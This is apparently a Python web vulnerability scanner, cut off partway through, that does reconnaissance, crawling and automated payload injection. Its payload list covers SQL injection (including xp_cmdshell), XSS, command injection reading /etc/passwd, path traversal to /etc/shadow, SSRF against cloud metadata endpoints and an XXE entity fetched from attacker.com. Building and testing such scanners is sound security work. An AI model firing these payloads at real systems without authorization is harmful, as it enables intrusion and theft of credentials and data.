#!/usr/bin/env python3
"""
BUG HUNTER PRO FINAL - Enterprise Web Vulnerability Scanner
Version: 4.1 - Fixed Production Edition
Author: Security Research Team
License: MIT
"""

import asyncio
import aiohttp
import argparse
import asyncio
import base64
import concurrent.futures
import csv
import datetime
import dns.resolver
import hashlib
import hmac
import html  # This is the module import
import ipaddress
import json
import os
import queue
import random
import re
import secrets
import socket
import ssl
import statistics
import string
import subprocess
import sys
import threading
import time
import uuid
import xml.etree.ElementTree as ET
import yaml
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, quote, unquote
import warnings

# Suppress SSL warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

# ============================================================================
# CONFIGURATION & CONSTANTS
# ============================================================================

class ScanMode(Enum):
    FAST = "fast"
    NORMAL = "normal"
    DEEP = "deep"
    AGGRESSIVE = "aggressive"

class Severity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

@dataclass
class ScanConfig:
    """Configuration for security scan"""
    target: str
    mode: ScanMode = ScanMode.NORMAL
    max_concurrent: int = 50
    timeout: int = 30
    depth: int = 3
    follow_redirects: bool = True
    verify_ssl: bool = False
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    output_formats: List[str] = field(default_factory=lambda: ["html", "json"])
    custom_wordlists: List[str] = field(default_factory=list)
    auth_token: Optional[str] = None
    cookies: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    excluded_paths: List[str] = field(default_factory=list)
    rate_limit: int = 10  # requests per second
    save_responses: bool = False
    proxy: Optional[str] = None
    enable_dashboard: bool = False
    dashboard_port: int = 8080
    scan_types: List[str] = field(default_factory=lambda: [
        "cms", "ecommerce", "framework", "cloud", "cicd",
        "websocket", "graphql", "cache", "smuggling", 
        "business_logic", "rate_limit", "dns_rebinding"
    ])

# ============================================================================
# PAYLOAD DATABASE
# ============================================================================

class PayloadDatabase:
    """Comprehensive payload database for all vulnerability types"""
    
    def __init__(self):
        self.payloads = self._load_payloads()
    
    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load all payloads"""
        return {
            # SQL Injection
            "sql": [
                "'", "''", "`", "\"", "' OR '1'='1", "' OR '1'='1' --", 
                "' OR '1'='1' #", "' OR '1'='1' /*", "admin' --", "admin' #",
                "' UNION SELECT NULL--", "' UNION SELECT NULL, NULL--",
                "1' ORDER BY 1--", "1' ORDER BY 1000--", 
                "' AND 1=1--", "' AND 1=2--",
                "' OR SLEEP(5)--", "' OR BENCHMARK(1000000,MD5('A'))--",
                "' OR 1=1--", "' OR 1=0--",
                "'; EXEC xp_cmdshell('dir'); --",
                "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND LENGTH(password)>1)--"
            ],
            
            # XSS Payloads
            "xss": [
                "<script>alert(document.domain)</script>",
                "<img src=x onerror=alert(1)>",
                "\"><svg/onload=alert(1)>",
                "javascript:alert(1)",
                "<body onload=alert(1)>",
                "<iframe src=\"javascript:alert(1)\">",
                "<input type=\"text\" value=\"\" onfocus=\"alert(1)\">",
                "<details open ontoggle=alert(1)>",
                "<video><source onerror=\"alert(1)\">",
                "<audio src=x onerror=alert(1)>",
                "<marquee onstart=alert(1)>",
                "<div style=\"width:1000px;height:1000px\" onmouseover=\"alert(1)\"></div>",
                "';alert(1)//",
                "\";alert(1)//",
                "</script><script>alert(1)</script>"
            ],
            
            # Command Injection
            "rce": [
                ";id",
                "|id",
                "&id",
                "&&id",
                "||id",
                "`id`",
                "$(id)",
                "id;",
                "id|",
                "id&",
                "id&&",
                "id||",
                "id`",
                "id$(",
                "sleep 5",
                "ping -c 5 127.0.0.1",
                "whoami",
                "uname -a",
                "ls -la",
                "cat /etc/passwd"
            ],
            
            # Path Traversal
            "lfi": [
                "../../../../etc/passwd",
                "../../../../etc/hosts",
                "../../../../etc/issue",
                "../../../../etc/shadow",
                "../../../../windows/win.ini",
                "../../../../boot.ini",
                "....//....//....//etc/passwd",
                "../" * 20 + "etc/passwd",
                "/etc/passwd%00",
                "/etc/passwd\x00",
                "php://filter/convert.base64-encode/resource=index.php",
                "php://filter/convert.base64-encode/resource=/etc/passwd"
            ],
            
            # SSRF
            "ssrf": [
                "http://localhost",
                "http://127.0.0.1",
                "http://0.0.0.0",
                "http://[::1]",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/instance?api-version=2017-04-02",
                "http://localhost:22",
                "http://127.0.0.1:3306",
                "file:///etc/passwd"
            ],
            
            # XXE
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><root></root>'
            ],
            
            # SSTI
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "${{7*7}}",
                "#{7*7}",
                "{{config}}",
                "{{settings.SECRET_KEY}}"
            ],
            
            # Open Redirect
            "redirect": [
                "http://evil.com",
                "https://evil.com",
                "//evil.com",
                "/\\evil.com",
                "evil.com"
            ],
            
            # CRLF Injection
            "crlf": [
                "%0d%0aSet-Cookie:malicious=payload",
                "%0d%0aX-Injected: header",
                "%0aX-Injected: header",
                "%0dX-Injected: header"
            ]
        }
    
    def get_payloads(self, vuln_type: str, limit: int = 10) -> List[str]:
        """Get payloads for a specific vulnerability type"""
        return self.payloads.get(vuln_type, [])[:limit]

# ============================================================================
# HTTP CLIENT WITH PROPER ERROR HANDLING
# ============================================================================

class HTTPClient:
    """Robust HTTP client with proper error handling"""
    
    def __init__(self, config: ScanConfig):
        self.config = config
        self.session = None
        self.ssl_context = None
        self.request_count = 0
        self.error_count = 0
        self.semaphore = asyncio.Semaphore(config.max_concurrent)
        
    async def __aenter__(self):
        await self.init_session()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.close()
    
    async def init_session(self):
        """Initialize HTTP session with proper configuration"""
        timeout = aiohttp.ClientTimeout(
            total=self.config.timeout,
            connect=10,
            sock_read=20
        )
        
        # Configure SSL context
        self.ssl_context = ssl.create_default_context()
        if not self.config.verify_ssl:
            self.ssl_context.check_hostname = False
            self.ssl_context.verify_mode = ssl.CERT_NONE
        
        # Configure connector
        connector = aiohttp.TCPConnector(
            limit=self.config.max_concurrent,
            ssl=self.ssl_context,
            enable_cleanup_closed=True
        )
        
        # Configure headers
        headers = {
            "User-Agent": self.config.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        headers.update(self.config.headers)
        
        # Create session
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers=headers,
            cookie_jar=aiohttp.CookieJar()
        )
        
        # Add cookies
        for name, value in self.config.cookies.items():
            self.session.cookie_jar.update_cookies({name: value})
        
        # Configure proxy
        if self.config.proxy:
            self.session._proxy = self.config.proxy
        
        return self
    
    async def request(self, method: str, url: str, **kwargs) -> Optional[aiohttp.ClientResponse]:
        """Make HTTP request with rate limiting and error handling"""
        await self.semaphore.acquire()
        
        try:
            # Rate limiting
            await asyncio.sleep(1 / self.config.rate_limit)
            
            # Set default kwargs
            kwargs.setdefault("allow_redirects", self.config.follow_redirects)
            kwargs.setdefault("ssl", self.ssl_context)
            
            # Make request
            self.request_count += 1
            response = await self.session.request(method, url, **kwargs)
            
            # Log request
            if self.request_count % 100 == 0:
                print(f"  [HTTP] Requests: {self.request_count}, Errors: {self.error_count}")
            
            return response
            
        except asyncio.TimeoutError:
            self.error_count += 1
            print(f"  [!] Timeout: {url}")
            return None
        except aiohttp.ClientError as e:
            self.error_count += 1
            print(f"  [!] Client error for {url}: {e}")
            return None
        except Exception as e:
            self.error_count += 1
            print(f"  [!] Unexpected error for {url}: {e}")
            return None
        finally:
            self.semaphore.release()
    
    async def get(self, url: str, **kwargs) -> Optional[aiohttp.ClientResponse]:
        """Make GET request"""
        return await self.request("GET", url, **kwargs)
    
    async def post(self, url: str, **kwargs) -> Optional[aiohttp.ClientResponse]:
        """Make POST request"""
        return await self.request("POST", url, **kwargs)
    
    async def head(self, url: str, **kwargs) -> Optional[aiohttp.ClientResponse]:
        """Make HEAD request"""
        return await self.request("HEAD", url, **kwargs)
    
    async def close(self):
        """Close session"""
        if self.session and not self.session.closed:
            await self.session.close()

# ============================================================================
# RECONNAISSANCE MODULE
# ============================================================================

class ReconnaissanceModule:
    """Comprehensive reconnaissance module"""
    
    def __init__(self, client: HTTPClient, config: ScanConfig):
        self.client = client
        self.config = config
        self.wordlists = self._load_wordlists()
    
    def _load_wordlists(self) -> Dict[str, List[str]]:
        """Load wordlists"""
        wordlists = {
            "subdomains": [
                "www", "api", "admin", "test", "dev", "staging", "mail", "ftp",
                "secure", "portal", "dashboard", "app", "mobile", "blog",
                "shop", "store", "support", "help", "cdn", "assets"
            ],
            "directories": [
                "admin", "administrator", "wp-admin", "cpanel", "phpmyadmin",
                "backup", "backups", "config", "configuration", "logs",
                "api", "v1", "v2", "graphql", "rest", "soap", "swagger",
                "debug", "test", "dev", "staging", "old", "new", "temp"
            ]
        }
        
        # Load custom wordlists
        for wordlist_path in self.config.custom_wordlists:
            try:
                with open(wordlist_path, 'r') as f:
                    lines = [line.strip() for line in f if line.strip()]
                    if "subdomain" in wordlist_path.lower():
                        wordlists["subdomains"].extend(lines)
                    else:
                        wordlists["directories"].extend(lines)
            except:
                pass
        
        return wordlists
    
    async def run(self) -> Dict[str, Any]:
        """Run reconnaissance"""
        print("[1/6] 🔍 RECONNAISSANCE")
        print("-" * 50)
        
        assets = {
            "target": self.config.target,
            "subdomains": [],
            "ips": [],
            "open_ports": {},
            "technologies": [],
            "directories": [],
            "dns_records": {},
            "cloud_info": {},
            "timestamp": datetime.now().isoformat()
        }
        
        domain = self._extract_domain(self.config.target)
        
        # Subdomain enumeration
        print("  [+] Enumerating subdomains...")
        assets["subdomains"] = await self.enumerate_subdomains(domain)
        
        # DNS enumeration
        print("  [+] Enumerating DNS records...")
        assets["dns_records"] = await self.enumerate_dns(domain)
        
        # Technology detection
        print("  [+] Detecting technologies...")
        assets["technologies"] = await self.detect_technologies(self.config.target)
        
        # Directory brute force
        print("  [+] Brute forcing directories...")
        assets["directories"] = await self.brute_force_directories(self.config.target)
        
        # Cloud detection
        print("  [+] Detecting cloud infrastructure...")
        assets["cloud_info"] = await self.detect_cloud(domain)
        
        return assets
    
    def _extract_domain(self, url: str) -> str:
        """Extract domain from URL"""
        parsed = urlparse(url)
        return parsed.netloc.split(":")[0]
    
    async def enumerate_subdomains(self, domain: str) -> List[str]:
        """Enumerate subdomains"""
        subdomains = set()
        
        # Brute force using wordlist
        tasks = []
        for sub in self.wordlists["subdomains"][:50]:  # Limit for speed
            subdomain = f"{sub}.{domain}"
            tasks.append(self._check_subdomain(subdomain))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, str):
                subdomains.add(result)
        
        return list(subdomains)
    
    async def _check_subdomain(self, subdomain: str) -> Optional[str]:
        """Check if subdomain exists"""
        try:
            # Try DNS resolution
            await dns.resolver.resolve(subdomain, 'A')
            return subdomain
        except:
            return None
    
    async def enumerate_dns(self, domain: str) -> Dict[str, List[str]]:
        """Enumerate DNS records"""
        dns_info = {
            "a": [], "aaaa": [], "cname": [], "mx": [],
            "txt": [], "ns": [], "soa": [], "srv": []
        }
        
        record_types = ["A", "AAAA", "CNAME", "MX", "TXT", "NS", "SOA"]
        
        for record_type in record_types:
            try:
                answers = await dns.resolver.resolve(domain, record_type)
                dns_info[record_type.lower()] = [str(r) for r in answers]
            except:
                pass
        
        return dns_info
    
    async def detect_technologies(self, url: str) -> List[Dict[str, str]]:
        """Detect web technologies"""
        technologies = []
        
        try:
            response = await self.client.get(url)
            if not response:
                return technologies
            
            # Handle binary content
            try:
                content = await response.text()
            except UnicodeDecodeError:
                # For binary files (images, etc.), just get headers
                content = ""
            
            headers = response.headers
            
            # Server detection
            server = headers.get("server", "").lower()
            if server:
                technologies.append({"type": "server", "name": server})
            
            # Framework detection
            frameworks = {
                "laravel": ["laravel", "csrf-token"],
                "django": ["django", "csrftoken"],
                "rails": ["rails", "_rails_app"],
                "express": ["express", "x-powered-by: express"],
                "spring": ["spring", "x-application-context"]
            }
            
            for framework, indicators in frameworks.items():
                if any(indicator in content.lower() or 
                       indicator in str(headers).lower() 
                       for indicator in indicators):
                    technologies.append({"type": "framework", "name": framework})
            
            # CMS detection
            cms_indicators = {
                "wordpress": ["wp-content", "wp-includes", "wordpress"],
                "joomla": ["joomla", "/media/system/"],
                "drupal": ["drupal", "sites/default/"],
                "magento": ["magento", "mage/"],
                "shopify": ["shopify", "cdn.shopify.com"]
            }
            
            for cms, indicators in cms_indicators.items():
                if any(indicator in content.lower() for indicator in indicators):
                    technologies.append({"type": "cms", "name": cms})
            
            # JavaScript frameworks
            js_frameworks = {
                "react": ["react", "react-dom"],
                "vue": ["vue.js", "vue.min.js"],
                "angular": ["angular", "ng-"]
            }
            
            for js_fw, indicators in js_frameworks.items():
                if any(indicator in content.lower() for indicator in indicators):
                    technologies.append({"type": "javascript", "name": js_fw})
            
        except Exception as e:
            print(f"    [!] Technology detection error: {e}")
        
        return technologies
    
    async def brute_force_directories(self, base_url: str) -> List[str]:
        """Brute force directories"""
        found_dirs = []
        
        tasks = []
        for directory in self.wordlists["directories"][:100]:  # Limit for speed
            url = f"{base_url.rstrip('/')}/{directory}"
            tasks.append(self._check_directory(url))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, str):
                found_dirs.append(result)
        
        return found_dirs
    
    async def _check_directory(self, url: str) -> Optional[str]:
        """Check if directory exists"""
        try:
            response = await self.client.head(url)
            if response and response.status in [200, 301, 302, 403]:
                return url
        except:
            pass
        return None
    
    async def detect_cloud(self, domain: str) -> Dict[str, Any]:
        """Detect cloud infrastructure"""
        cloud_info = {
            "provider": None,
            "services": [],
            "indicators": []
        }
        
        # Check DNS for cloud indicators
        try:
            answers = await dns.resolver.resolve(domain, 'CNAME')
            for answer in answers:
                cname = str(answer.target).lower()
                
                if "amazonaws.com" in cname:
                    cloud_info["provider"] = "aws"
                    cloud_info["services"].append("AWS")
                    cloud_info["indicators"].append(cname)
                elif "azure" in cname:
                    cloud_info["provider"] = "azure"
                    cloud_info["services"].append("Azure")
                    cloud_info["indicators"].append(cname)
                elif "google" in cname or "cloud.google" in cname:
                    cloud_info["provider"] = "gcp"
                    cloud_info["services"].append("GCP")
                    cloud_info["indicators"].append(cname)
                elif "cloudflare" in cname:
                    cloud_info["services"].append("Cloudflare")
                    cloud_info["indicators"].append(cname)
                    
        except:
            pass
        
        return cloud_info

# ============================================================================
# CRAWLER MODULE WITH BINARY CONTENT HANDLING
# ============================================================================

class SmartCrawler:
    """Intelligent web crawler with binary content handling"""
    
    def __init__(self, client: HTTPClient, config: ScanConfig):
        self.client = client
        self.config = config
        self.visited = set()
        self.endpoints = []
        self.lock = asyncio.Lock()
    
    async def crawl(self, start_url: str) -> List[Dict[str, Any]]:
        """Crawl website for endpoints"""
        print("\n[2/6] 🕷️  CRAWLING")
        print("-" * 50)
        
        await self._crawl_recursive(start_url, depth=0)
        
        print(f"  [+] Found {len(self.endpoints)} endpoints")
        return self.endpoints
    
    async def _crawl_recursive(self, url: str, depth: int):
        """Recursive crawling"""
        if depth > self.config.depth or url in self.visited:
            return
        
        async with self.lock:
            self.visited.add(url)
        
        try:
            response = await self.client.get(url)
            if not response:
                return
            
            # Handle binary content (images, PDFs, etc.)
            content_type = response.headers.get("content-type", "").lower()
            is_binary = any(x in content_type for x in ["image/", "application/pdf", "application/octet-stream"])
            
            if is_binary:
                # For binary files, just record the endpoint without content
                endpoint = {
                    "url": str(response.url),
                    "method": "GET",
                    "status": response.status,
                    "content_type": content_type,
                    "content_length": int(response.headers.get("content-length", 0)),
                    "forms": [],
                    "links": [],
                    "is_binary": True
                }
                
                async with self.lock:
                    self.endpoints.append(endpoint)
                return
            
            # For text content, extract links and forms
            try:
                content = await response.text()
            except UnicodeDecodeError:
                # If we can't decode as UTF-8, treat as binary
                endpoint = {
                    "url": str(response.url),
                    "method": "GET",
                    "status": response.status,
                    "content_type": content_type,
                    "content_length": int(response.headers.get("content-length", 0)),
                    "forms": [],
                    "links": [],
                    "is_binary": True
                }
                
                async with self.lock:
                    self.endpoints.append(endpoint)
                return
            
            # Extract endpoint info for text content
            endpoint = {
                "url": str(response.url),
                "method": "GET",
                "status": response.status,
                "content_type": content_type,
                "content_length": len(content),
                "forms": self._extract_forms(content, str(response.url)),
                "links": [],
                "is_binary": False
            }
            
            async with self.lock:
                self.endpoints.append(endpoint)
            
            # Extract links for further crawling (skip binary files)
            links = self._extract_links(content, str(response.url))
            filtered_links = []
            
            for link in links:
                # Skip common binary file extensions
                if not self._is_binary_file(link):
                    filtered_links.append(link)
            
            # Crawl links
            if depth < self.config.depth:
                tasks = []
                for link in filtered_links[:20]:  # Limit for performance
                    if link not in self.visited:
                        tasks.append(self._crawl_recursive(link, depth + 1))
                
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
                    
        except Exception as e:
            print(f"    [!] Crawling error for {url}: {e}")
    
    def _is_binary_file(self, url: str) -> bool:
        """Check if URL points to a binary file"""
        binary_extensions = [
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.ico',
            '.pdf', '.zip', '.tar', '.gz', '.rar', '.7z',
            '.exe', '.dll', '.so', '.bin', '.dat',
            '.mp3', '.mp4', '.avi', '.mov', '.wav',
            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx'
        ]
        
        url_lower = url.lower()
        return any(url_lower.endswith(ext) for ext in binary_extensions)
    
    def _extract_links(self, html: str, base_url: str) -> List[str]:
        """Extract links from HTML"""
        links = set()
        
        # Extract href attributes
        href_pattern = r'href=["\']([^"\']+)["\']'
        href_matches = re.findall(href_pattern, html, re.IGNORECASE)
        
        for href in href_matches:
            # Skip JavaScript, mailto, etc.
            if href.startswith(('javascript:', 'mailto:', 'tel:', '#', 'data:')):
                continue
            
            # Convert to absolute URL
            absolute_url = urljoin(base_url, href)
            
            # Filter by domain
            if self._is_same_domain(absolute_url, base_url):
                links.add(absolute_url)
        
        # Extract src attributes
        src_pattern = r'src=["\']([^"\']+)["\']'
        src_matches = re.findall(src_pattern, html, re.IGNORECASE)
        
        for src in src_matches:
            absolute_url = urljoin(base_url, src)
            if self._is_same_domain(absolute_url, base_url):
                links.add(absolute_url)
        
        return list(links)
    
    def _extract_forms(self, html: str, base_url: str) -> List[Dict[str, Any]]:
        """Extract forms from HTML"""
        forms = []
        
        form_pattern = r'<form[^>]*>(.*?)</form>'
        form_matches = re.finditer(form_pattern, html, re.DOTALL | re.IGNORECASE)
        
        for match in form_matches:
            form_html = match.group(0)
            
            # Extract action
            action_match = re.search(r'action=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
            action = action_match.group(1) if action_match else ""
            action_url = urljoin(base_url, action)
            
            # Extract method
            method_match = re.search(r'method=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
            method = method_match.group(1).upper() if method_match else "GET"
            
            # Extract inputs
            inputs = []
            input_pattern = r'<(input|textarea|select)[^>]*>'
            input_matches = re.finditer(input_pattern, form_html, re.IGNORECASE)
            
            for input_match in input_matches:
                input_html = input_match.group(0)
                
                # Extract name
                name_match = re.search(r'name=["\']([^"\']+)["\']', input_html, re.IGNORECASE)
                if name_match:
                    name = name_match.group(1)
                    
                    # Extract type
                    type_match = re.search(r'type=["\']([^"\']+)["\']', input_html, re.IGNORECASE)
                    input_type = type_match.group(1) if type_match else "text"
                    
                    # Extract value
                    value_match = re.search(r'value=["\']([^"\']+)["\']', input_html, re.IGNORECASE)
                    value = value_match.group(1) if value_match else ""
                    
                    inputs.append({
                        "name": name,
                        "type": input_type,
                        "value": value
                    })
            
            forms.append({
                "action": action_url,
                "method": method,
                "inputs": inputs
            })
        
        return forms
    
    def _is_same_domain(self, url1: str, url2: str) -> bool:
        """Check if URLs are in same domain"""
        try:
            domain1 = urlparse(url1).netloc
            domain2 = urlparse(url2).netloc
            return domain1 == domain2 or domain1.endswith(f".{domain2}") or domain2.endswith(f".{domain1}")
        except:
            return False

# ============================================================================
# VULNERABILITY SCANNER WITH FIXED SSRF TEST
# ============================================================================

class VulnerabilityScanner:
    """Main vulnerability scanner"""
    
    def __init__(self, client: HTTPClient, config: ScanConfig):
        self.client = client
        self.config = config
        self.payloads = PayloadDatabase()
        self.findings = []
    
    async def scan_endpoints(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Scan endpoints for vulnerabilities"""
        print("\n[3/6] ⚡ VULNERABILITY SCANNING")
        print("-" * 50)
        
        all_findings = []
        
        # Filter out binary endpoints (images, PDFs, etc.)
        text_endpoints = [e for e in endpoints if not e.get("is_binary", False)]
        
        # Test each endpoint
        for i, endpoint in enumerate(text_endpoints[:50]):  # Limit for performance
            if i % 10 == 0:
                print(f"  [+] Scanning endpoint {i+1}/{min(50, len(text_endpoints))}")
            
            endpoint_findings = await self.scan_single_endpoint(endpoint)
            if endpoint_findings:
                all_findings.extend(endpoint_findings)
        
        self.findings = all_findings
        return all_findings
    
    async def scan_single_endpoint(self, endpoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Scan single endpoint"""
        findings = []
        url = endpoint["url"]
        
        # Skip binary endpoints
        if endpoint.get("is_binary", False):
            return findings
        
        # Extract parameters from URL
        parsed = urlparse(url)
        params = self._extract_params(parsed.query)
        
        # Test each parameter
        for param_name, param_value in params:
            param_findings = await self.test_parameter(url, param_name, param_value)
            if param_findings:
                findings.extend(param_findings)
        
        # Test forms
        for form in endpoint.get("forms", []):
            form_findings = await self.test_form(form)
            if form_findings:
                findings.extend(form_findings)
        
        # Test for common vulnerabilities
        common_findings = await self.test_common_vulnerabilities(url)
        if common_findings:
            findings.extend(common_findings)
        
        return findings
    
    def _extract_params(self, query: str) -> List[Tuple[str, str]]:
        """Extract parameters from query string"""
        params = []
        if query:
            for param in query.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    params.append((unquote(key), unquote(value)))
        return params
    
    async def test_parameter(self, url: str, param_name: str, original_value: str) -> List[Dict[str, Any]]:
        """Test URL parameter for vulnerabilities"""
        findings = []
        
        # SQL Injection
        sql_findings = await self.test_sql_injection(url, param_name, original_value)
        if sql_findings:
            findings.extend(sql_findings)
        
        # XSS
        xss_findings = await self.test_xss(url, param_name, original_value)
        if xss_findings:
            findings.extend(xss_findings)
        
        # Command Injection
        rce_findings = await self.test_command_injection(url, param_name, original_value)
        if rce_findings:
            findings.extend(rce_findings)
        
        # Path Traversal
        lfi_findings = await self.test_path_traversal(url, param_name, original_value)
        if lfi_findings:
            findings.extend(lfi_findings)
        
        # SSRF
        ssrf_findings = await self.test_ssrf(url, param_name, original_value)
        if ssrf_findings:
            findings.extend(ssrf_findings)
        
        return findings
    
    async def test_sql_injection(self, url: str, param_name: str, original_value: str) -> List[Dict[str, Any]]:
        """Test for SQL injection"""
        findings = []
        
        for payload in self.payloads.get_payloads("sql", 5):
            test_url = self._inject_payload(url, param_name, payload)
            
            try:
                response = await self.client.get(test_url)
                if not response:
                    continue
                
                content = await response.text()
                
                # Check for SQL errors
                sql_errors = [
                    "sql syntax", "mysql", "postgresql", "sqlite",
                    "ora-", "microsoft.*driver", "odbc",
                    "you have an error in your sql syntax",
                    "unclosed quotation mark"
                ]
                
                for error in sql_errors:
                    if re.search(error, content, re.IGNORECASE):
                        findings.append({
                            "title": "SQL Injection Vulnerability",
                            "description": f"SQL injection detected in parameter '{param_name}'",
                            "severity": "critical",
                            "url": test_url,
                            "parameter": param_name,
                            "payload": payload,
                            "evidence": f"SQL error detected: {error}",
                            "confidence": "high"
                        })
                        break
                        
            except Exception as e:
                continue
        
        return findings
    
    async def test_xss(self, url: str, param_name: str, original_value: str) -> List[Dict[str, Any]]:
        """Test for XSS"""
        findings = []
        
        for payload in self.payloads.get_payloads("xss", 3):
            test_url = self._inject_payload(url, param_name, payload)
            
            try:
                response = await self.client.get(test_url)
                if not response:
                    continue
                
                content = await response.text()
                
                # Check if payload is reflected
                if payload in content:
                    findings.append({
                        "title": "Cross-Site Scripting (XSS)",
                        "description": f"XSS payload reflected in parameter '{param_name}'",
                        "severity": "high",
                        "url": test_url,
                        "parameter": param_name,
                        "payload": payload,
                        "evidence": "Payload reflected in response",
                        "confidence": "medium"
                    })
                    
            except Exception as e:
                continue
        
        return findings
    
    async def test_command_injection(self, url: str, param_name: str, original_value: str) -> List[Dict[str, Any]]:
        """Test for command injection"""
        findings = []
        
        for payload in self.payloads.get_payloads("rce", 3):
            test_url = self._inject_payload(url, param_name, payload)
            
            try:
                start_time = time.time()
                response = await self.client.get(test_url, timeout=10)
                elapsed = time.time() - start_time
                
                if not response:
                    continue
                
                content = await response.text()
                
                # Time-based detection for sleep payloads
                if "sleep" in payload and elapsed > 4:
                    findings.append({
                        "title": "Command Injection (Time-based)",
                        "description": f"Time-based command injection in parameter '{param_name}'",
                        "severity": "critical",
                        "url": test_url,
                        "parameter": param_name,
                        "payload": payload,
                        "evidence": f"Response delayed by {elapsed:.2f} seconds",
                        "confidence": "medium"
                    })
                
                # Check for command output
                if any(indicator in content.lower() for indicator in 
                      ["uid=", "gid=", "groups=", "root:x:"]):
                    findings.append({
                        "title": "Command Injection",
                        "description": f"Command injection in parameter '{param_name}'",
                        "severity": "critical",
                        "url": test_url,
                        "parameter": param_name,
                        "payload": payload,
                        "evidence": "Command output found in response",
                        "confidence": "high"
                    })
                    
            except Exception as e:
                continue
        
        return findings
    
    async def test_path_traversal(self, url: str, param_name: str, original_value: str) -> List[Dict[str, Any]]:
        """Test for path traversal"""
        findings = []
        
        for payload in self.payloads.get_payloads("lfi", 3):
            test_url = self._inject_payload(url, param_name, payload)
            
            try:
                response = await self.client.get(test_url)
                if not response:
                    continue
                
                content = await response.text()
                
                # Check for file contents
                if "root:x:0:0:" in content:
                    findings.append({
                        "title": "Local File Inclusion (LFI)",
                        "description": f"Path traversal in parameter '{param_name}'",
                        "severity": "critical",
                        "url": test_url,
                        "parameter": param_name,
                        "payload": payload,
                        "evidence": "/etc/passwd file accessed",
                        "confidence": "high"
                    })
                    
            except Exception as e:
                continue
        
        return findings
    
    async def test_ssrf(self, url: str, param_name: str, original_value: str) -> List[Dict[str, Any]]:
        """Test for SSRF - FIXED VERSION"""
        findings = []
        
        for payload in self.payloads.get_payloads("ssrf", 3):
            test_url = self._inject_payload(url, param_name, payload)
            
            try:
                response = await self.client.get(test_url, timeout=5)
                if not response:
                    continue
                
                content = await response.text()
                
                # Check for internal service responses
                if any(indicator in content for indicator in 
                      ["instance-id", "ami-id", "local-ipv4"]):
                    findings.append({
                        "title": "Server-Side Request Forgery (SSRF)",
                        "description": f"SSRF in parameter '{param_name}'",
                        "severity": "critical",
                        "url": test_url,
                        "parameter": param_name,
                        "payload": payload,
                        "evidence": "Internal service response detected",
                        "confidence": "high"
                    })
                    
            except Exception as e:
                continue
        
        return findings  # Always return a list
    
    async def test_form(self, form: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test form for vulnerabilities"""
        findings = []
        
        url = form["action"]
        method = form["method"]
        
        # Prepare form data
        data = {}
        for input_field in form["inputs"]:
            data[input_field["name"]] = input_field["value"] or "test"
        
        # Test each input
        for input_field in form["inputs"]:
            input_name = input_field["name"]
            
            # Test SQL injection in forms
            for payload in self.payloads.get_payloads("sql", 2):
                test_data = data.copy()
                test_data[input_name] = payload
                
                try:
                    if method == "POST":
                        response = await self.client.post(url, data=test_data)
                    else:
                        response = await self.client.get(url, params=test_data)
                    
                    if not response:
                        continue
                    
                    content = await response.text()
                    
                    # Check for SQL errors
                    if any(error in content.lower() for error in 
                          ["sql", "syntax", "mysql", "postgres"]):
                        findings.append({
                            "title": "SQL Injection in Form",
                            "description": f"SQL injection in form field '{input_name}'",
                            "severity": "critical",
                            "url": url,
                            "parameter": input_name,
                            "payload": payload,
                            "evidence": "SQL error in response",
                            "confidence": "high"
                        })
                        break
                        
                except Exception as e:
                    continue
        
        return findings
    
    async def test_common_vulnerabilities(self, url: str) -> List[Dict[str, Any]]:
        """Test for common vulnerabilities"""
        findings = []
        
        # Check for security headers
        try:
            response = await self.client.head(url)
            if response:
                headers = response.headers
                
                missing_headers = []
                security_headers = [
                    "Strict-Transport-Security",
                    "X-Content-Type-Options",
                    "X-Frame-Options",
                    "Content-Security-Policy"
                ]
                
                for header in security_headers:
                    if header not in headers:
                        missing_headers.append(header)
                
                if missing_headers:
                    findings.append({
                        "title": "Missing Security Headers",
                        "description": "Important security headers are missing",
                        "severity": "low",
                        "url": url,
                        "evidence": f"Missing headers: {', '.join(missing_headers)}",
                        "confidence": "high"
                    })
        except:
            pass
        
        # Check for HTTP methods
        try:
            response = await self.client.request("OPTIONS", url)
            if response:
                allow_header = response.headers.get("Allow", "")
                if "PUT" in allow_header or "DELETE" in allow_header:
                    findings.append({
                        "title": "Potentially Dangerous HTTP Methods Enabled",
                        "description": "PUT and/or DELETE methods are enabled",
                        "severity": "medium",
                        "url": url,
                        "evidence": f"Allowed methods: {allow_header}",
